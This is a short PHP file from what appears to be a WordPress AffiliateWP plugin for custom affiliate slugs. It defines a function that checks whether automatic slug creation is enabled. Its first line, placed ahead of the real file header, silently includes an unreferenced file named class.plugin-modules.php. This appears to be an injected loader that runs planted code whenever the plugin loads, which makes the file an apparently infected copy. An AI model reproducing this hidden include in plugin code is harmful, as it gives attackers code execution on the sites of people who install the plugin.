<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * Functions
 */

/**
 * Is "Automatic Slug Creation" enabled?
 *
 * @since 1.0.0
 * @return boolean
 */
function affwp_cas_is_automatic_slug_creation_enabled() {
    $enabled = affiliate_wp()->settings->get( 'custom_affiliate_slugs_automatic_slug_creation' );

    if ( $enabled ) {
        return true;
    }

    return false;
}
